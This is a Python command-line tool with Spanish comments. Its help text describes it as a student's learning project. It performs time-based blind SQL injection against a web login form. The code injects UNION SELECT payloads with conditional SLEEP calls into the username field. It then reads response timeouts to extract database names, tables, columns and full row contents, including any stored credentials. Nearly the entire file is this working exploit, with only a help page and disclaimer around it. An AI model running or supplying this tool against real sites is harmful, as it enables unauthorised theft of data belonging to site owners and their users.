# coding=utf-8
import requests
import sys

THRESHOLD= '1.6'	#constante umbral de tiempo de demora de la respuesta (siempre mayor que TIMEOUT)
TIMEOUT = 1.5		#constante de tiempo de expiración de la petición HTTP
MAX_COLUMN_NUMBER = 10	#máximo número de columnas de la consulta base realizada por el servidor web

def send_query(query):	#función destinada a mandar una sentencia y detectar si se ha consumido el timeout o no
	try:
		content = {'username':query, 'password' : 'abcd'}	#contenido de la petición con la consulta correspondiente
		response = requests.post(url, data=content, timeout=TIMEOUT)	#envio de la peticion
		return False
	except:	#si se produce un timeout 
		return True
	

def get_word_length(q1, q2, q3):	#función destinada a obtener la longitud de la cadena de una celda de la DB
	length = ''
	finalChar = False
	i = 0
	while(True):	#mientras que no se detecte el final de la cadena
		for j in range(10):	#numeros del 0 al 9	(ya que se va detectando de digito en digito)
			query = q1 + str(i+1) + q2 + str(j) + q3
			if (send_query(query)):	#si se detecta un timeout
				length = length + str(j)	#se confirma como acertado y se añade a la longitud
				break
			if (j == 9):	#si se llega al numero 9 sin obtener ningun acierto, se da por hecho que la cadena ha terminado
				finalChar = True	#flag de salida
		if(finalChar == True):
			break	#salida del bucle
		i = i+1 	#variable de posicion
	if(length == ''):	#si ha habido algun error en la extraccion
		length = '0'	#reseteo de la variable
	return length

def get_row_number(table):	#funcion destinada a obtener el numero de filas de la tabla
	rows = ''
	finalChar = False
	i = 0
	while(True):	#mientras que no se detecte el final de la cadena
		for j in range(10):	#numeros del 0 al 9	(ya que se va detectando de digito en digito)
			query = 'abcd\' UNION SELECT IF((SELECT MID(count(*), ' + str(i+1) + ', 1) FROM ' + table + ') = "' + str(j) + '", SLEEP(' + THRESHOLD + '), SLEEP(0))' + endString
			if (send_query(query)):	#si se detecta un timeout
				rows = rows + str(j)	#se confirma como acertado y se añade al numero de filas
				break
			if (j == 9):	#si se llega al numero 9 sin obtener ningun acierto, se da por hecho que la cadena ha terminado
				finalChar = True	#flag de salida
		if(finalChar == True):
			break	#salida del bucle
		i = i+1 	#variable de posicion
	if(rows == ''):	#si ha habido algun error en la extraccion
		rows = '0'	#reseteo de la variable
	return rows
	

def get_column_number():	#función destinada a hallar el número de columnas seleccionadas en la consulta, no tiene por que ser el total de la tabla
	query = 'abcd\' UNION SELECT IF(1=1, SLEEP(' + THRESHOLD + '), SLEEP(0))'  #payload básico
	endString = ''
	for i in range(MAX_COLUMN_NUMBER):		#suponiendo que no se seleccionarán más de diez filas de la tabla
		if(send_query(query)):	#si la función de envío de la sentencia devuelve true
			break	#se sale del bucle
		if(i == 0):	#si es la primera vez que se tiene que añadir una columna
			endString = endString + ', \'1'
			query = query + ', \'1'
		else:	#el resto de veces 
			endString = endString + '\', \'1'
			query = query + '\', \'1'
	return endString	#devuelve el número de columnas hallado	

def get_DB_name():	#funcion destinada a obtener el nombre de las bases de datos (sobre las que el usuario tiene permisos)
	database_name = ''
	rows = int(get_row_number('information_schema.schemata'))	#obtencion de las filas de la tabla
	for k in range(rows):	#bucle que recorre el numero de filas
		#obtencion de la longitud de la siguiente celda
		length = int(get_word_length('abcd\' UNION SELECT IF((SELECT MID(LENGTH(schema_name), ', ', 1) FROM information_schema.schemata LIMIT ' + str(k) + ', 1) = "', '", SLEEP(' + THRESHOLD + '), SLEEP(0))' + endString))
		if(length == 0):	#si es 0 finaliza
			break
		for i in range(length):	#recorrido de la longitud de la cadena de la celda
			for j in range(32, 126):	#bucle que recorre los codigos ASCII que interesan
				query = 'abcd\' UNION SELECT IF((SELECT ASCII(MID(schema_name, ' + str(i+1) + ', 1)) FROM information_schema.schemata LIMIT ' + str(k) + ', 1) = "' + str(j) + '", SLEEP(' + THRESHOLD + '), SLEEP(0))' + endString
				if (send_query(query)):#si la función de envío de la sentencia devuelve true
					database_name = database_name + chr(j)	#se añade el caracter a la cadena
					print('\r\t[-] ' + database_name, end='')	#se imprime
					break
		print('\n', end='')
		database_name = ''
		
def get_table_name(DBName): #funcion destinada a obtener el nombre de las tablas de una base de datos seleccionada
	table_name = ''
	rows = int(get_row_number('information_schema.tables WHERE table_schema = "' + DBName + '"')) #obtencion de las filas de la tabla

	for k in range(rows):#bucle que recorre el numero de filas
		#obtencion de la longitud de la siguiente celda
		length = int(get_word_length('abcd\' UNION SELECT IF((SELECT MID(LENGTH(table_name), ', ', 1) FROM information_schema.tables WHERE table_schema = "' + DBName + '" LIMIT ' + str(k) + ', 1) = "', '", SLEEP(' + THRESHOLD + '), SLEEP(0))' + endString))
		if(length == 0): #si es 0 finaliza
			break
		for i in range(length): #recorrido de la longitud de la cadena de la celda
			for j in range(32, 126): #bucle que recorre los codigos ASCII que interesan
				query = 'abcd\' UNION SELECT IF((SELECT ASCII(MID(table_name, ' + str(i+1) + ', 1)) FROM information_schema.tables WHERE table_schema = "' + DBName + '" LIMIT ' + str(k) + ', 1) = "' + str(j) + '", SLEEP(' + THRESHOLD + '), SLEEP(0))' + endString
				if (send_query(query)): #si la función de envío de la sentencia devuelve true
					table_name = table_name + chr(j) #se añade el caracter a la cadena
					print('\r\t[-] ' + table_name, end='') #se imprime
					break
		print('\n', end='')
		table_name = ''	



def get_column_name(table, DBName): #funcion destinada a obtener el nombre de las columnas de una tabla de una base de datos seleccionada
	column_name = ''
	#obtencion de las filas de la tabla
	rows = int(get_row_number('information_schema.columns WHERE table_name = "' + table + '" AND table_schema = "' + DBName + '"'))

	for k in range(rows):#bucle que recorre el numero de filas
		#obtencion de la longitud de la siguiente celda
		length = int(get_word_length('abcd\' UNION SELECT IF((SELECT MID(LENGTH(column_name), ', ', 1) FROM information_schema.columns WHERE table_name = "' + table + '" AND table_schema = "' + DBName + '" LIMIT ' + str(k) + ', 1) = "', '", SLEEP(' + THRESHOLD + '), SLEEP(0))' + endString))
		if(length == 0): #si es 0 finaliza
			break
		for i in range(length): #recorrido de la longitud de la cadena de la celda
			for j in range(32, 126): #bucle que recorre los codigos ASCII que interesan
				query = 'abcd\' UNION SELECT IF((SELECT ASCII(MID(column_name, '+ str(i+1) +', 1)) FROM information_schema.columns WHERE table_name = "' + table + '" AND table_schema = "' + DBName + '" LIMIT ' + str(k) + ', 1) = "' + str(j) + '", SLEEP(' + THRESHOLD + '), SLEEP(0))' + endString
				if (send_query(query)): #si la función de envío de la sentencia devuelve true
					column_name = column_name + chr(j) #se añade el caracter a la cadena
					print('\r\t[-] ' + column_name, end='') #se imprime
					break
		print('\n', end='')
		column_name = '' 


def get_column_info(columns, table, DBName): #funcion destinada a obtener el contenido de una serie de columnas seleccionadas de una tabla de una base de datos
	info = ''
	condition = ''
	firstColumn = []
	rowInfo = []
	rows = int(get_row_number(table)) #obtencion de las filas de la tabla

	#bucle de obtencion de la primera columna, a partir de la cual se obtendra la informacion en funcion suya
	for k in range(rows): #bucle que recorre el numero de filas
		#obtencion de la longitud de la siguiente celda
		length = int(get_word_length('abcd\' UNION SELECT IF((SELECT MID(LENGTH(' + columns[0] + '), ', ', 1) FROM ' + table + ' LIMIT ' + str(k) + ', 1) = "', '", SLEEP(' + THRESHOLD + '), SLEEP(0))' + endString))	
		if(length == 0): #si es 0 finaliza
			break
		for i in range(length): #recorrido de la longitud de la cadena de la celda
			for j in range(32, 126): #bucle que recorre los codigos ASCII que interesan
				query = 'abcd\' UNION SELECT IF((SELECT ASCII(MID(' + columns[0] + ', '+ str(i+1) +', 1)) FROM ' + table + ' LIMIT ' + str(k) + ', 1) = "' + str(j) + '", SLEEP(' + THRESHOLD + '), SLEEP(0))' + endString
				if (send_query(query)): #si la función de envío de la sentencia devuelve true
					info = info + chr(j) #se añade el caracter a la cadena
					break
		firstColumn.append(info)	#se añaden todas las columnas a un array
		info = '' 

	#bucle de obtencion del resto de columnas en funcion de la primera
	if(len(columns) > 1):	#si hay mas de una columna
		for k in range(rows): #bucle que recorre el numero de filas
			#condicion de fijacion del contenido a las columnas obtenidas en primer lugar
			condition = 'WHERE ' + columns[0] + ' = "' + firstColumn[k] + '"'
			for c in range(len(columns)-1): #bucle que recorre el numero de columnas restantes
				#obtencion de la longitud de la siguiente celda
				length = int(get_word_length('abcd\' UNION SELECT IF((SELECT MID(LENGTH(' + columns[c+1] + '), ', ', 1) FROM ' + table + ' ' + condition + ' LIMIT 0, 1) = "', '", SLEEP(' + THRESHOLD + '), SLEEP(0))' + endString))	
				if(length == 0): #si es 0 finaliza
					break
				for i in range(length): #recorrido de la longitud de la cadena de la celda
					for j in range(32, 126): #bucle que recorre los codigos ASCII que interesan
						query = 'abcd\' UNION SELECT IF((SELECT ASCII(MID(' + columns[c+1] + ', '+ str(i+1) +', 1)) FROM ' + table + ' ' + condition + ' LIMIT 0, 1) = "' + str(j) + '", SLEEP(' + THRESHOLD + '), SLEEP(0))' + endString
						if (send_query(query)): #si la función de envío de la sentencia devuelve true
							info = info + chr(j) #se añade el caracter a la cadena
							break
				rowInfo.append(info) #se añaden todas las filas a un array
				info = '' 
			#impresion de los arrays
			print('\t[-] Columna "' + columns[0] + '": ' + firstColumn[k], end="")
			for n in range(len(rowInfo)):
				print('\t[-] Columna "' + columns[n+1] + '": ' + rowInfo[n], end="")
			print('\n')
			rowInfo = []
	else:	#si solo habia una fila se imprime ella solas
		for k in range(rows):
			print('\t[-] Columna "' + columns[0] + '": ' + firstColumn[k], end="")	

def main():	#cuerpo de la funcion principal
	
	
	if(sys.argv[1] == '-h'):	#ayuda
		print('**********************************************************************************************************************************\n')
		print('[*]Este código ha sido desarrollado por Miguel Saz Dones, estudiante de la Universidad de Alcalá de henares (UAH), a fecha 24/02/2022, \ncon la única finalidad de servir de manera didáctica al autor para entender el funcionamiento y el proceso \nde creación de una herramienta de estas características, además de comprender en mayor medida el funcionamiento \nde una base de datos SQL.\n')
		print('[*]Para el desarrollo de esta herramienta, se ha utilizado un como objetivo un formulario concreto y una base de datos MySQL, por lo que es \nposible que tenga que ser editado si se desea adaptarlo a otros entornos.\n')
		print('[*]Renuncia de responsabilidad: El autor no se hace responsable de las actividades ilegales que puedan ser perpetradas por \notras personas empleando para ello la herramienta esta herramienta.\n')
		print('**********************************************************************************************************************************\n')
		print('[*]This script has been developed by Miguel Saz Dones, student of the University of Alcalá de Henares (UAH), on date 24/02/2022, \nwith the sole purpose of serving didacticaly to the author for understanding the operation and the process of \ncreating a tool of these characteristics, in addition to better understanding the operation of a SQL database.\n')
		print('[*]For the development of these tool, a specific web form and a MySQL database have been used as the target, so it may have to be edited if you want \nto adapt it to other environments.\n')
		print('[*]Disclaimer: The author accepts no responsibility for the illegal activities that may be perpetrated by other people using this tool.\n')
		print('**********************************************************************************************************************************\n')
		print('[*]Tool Execution:\n')
		print('\t[-] python3 MapeoMySQL.py <option> <URL>\n')
		print('[*]Tool Options:\n')
		print('\t[-] h: Show help page.\n')
		print('\t[-] d: Extract database names from given URL.\n')
		print('\t[-] t: Extract table names from given URL and database name.\n')
		print('\t[-] c: Extract column names from given URL, database name and table name.\n')
		print('\t[-] i: Extract column content from given URL, database name, table name and list of columns.\n')
		print('[*]Example:\n')
		print('\t[-] python3 MapeoMySQL.py -d http://127.0.0.1/webpage.html\n')
	elif(len(sys.argv) > 2):	
		#obtencion de los argumentos de entrada
		global url
		url = sys.argv[2] 
		global endString
		endString = get_column_number() #obtencion del numero de columnas solicitadas en la consulta base 

		mode = sys.argv[1]	#modo de ejecucion

		#variables de informacion de la DB
		DB =''
		T = ''
		C = ''
		while True:
			if(mode == '-d'):	#modo extraccion de las bases de datos
				print("[*] Bases de datos:\n")
				get_DB_name()
				print("\n[*] ¿Quiere comprobar de nuevo? [s/n]\n")
				if(input() == 's'):
					print("\n[*] Volviendo a comprobar...\n")
					get_DB_name()
				print('\n[*] ¿Quiere seleccionar una base de datos para extraer las tablas? [s/n]')
				if(input() == 's'):
					mode = '-t'
				else:
					break
			elif(mode == '-t'): #modo extraccion de las tablas de las bases de datos
				print('\n[*] Introduzca una base de datos:')
				DB = input()
				print("\n[*] Tablas de " + DB + ":\n")
				get_table_name(DB)
				print("\n[*] ¿Quiere comprobar de nuevo? [s/n]\n")
				if(input() == 's'):
					print("\n[*] Volviendo a comprobar...\n")
					get_table_name(DB)
				print('\n[*] ¿Quiere seleccionar una tabla para extraer las columnas? [s/n]')
				if(input() == 's'):
					mode = '-c'
				else:
					break
			elif(mode == '-c'): #modo extraccion de las columnas de una tabla de una base de datos
				if(DB == ''):
					print('\n[*] Introduzca una base de datos:')
					DB = input()
				print('\n[*] Introduzca una tabla:')
				T = input()
				print("\n[*] Columnas de la tabla " + T + " de " + DB + ":\n")
				get_column_name(T, DB)
				print("\n[*] ¿Quiere comprobar de nuevo? [s/n]\n")
				if(input() == 's'):
					print("\n[*] Volviendo a comprobar...\n")
					get_column_name(T, DB)
				print('\n[*] ¿Quiere mostrar la información de las columnas? [s/n]')
				if(input() == 's'):
					mode = '-i'
				else:
					break
			elif(mode == '-i'):	#modo extraccion de la informacion de la base de datos (contenido)
				if(DB == ''):
					print('\n[*] Introduzca una base de datos:')
					DB = input()	
				if(T == ''):
					print('\n[*] Introduzca una tabla:')
					T = input()
				print('\n[*] Introduzca las columnas separadas por comas:')
				C = input().split(',')

				get_column_info(C, T, DB)
				print("\n[*] ¿Quiere comprobar de nuevo? [s/n]\n")
				if(input() == 's'):
					print("\n[*] Volviendo a comprobar...\n")
					get_column_info(C, T, DB)
				break
	else:
		print('[*]Faltan argumentos.')

if __name__ == "__main__":
	main()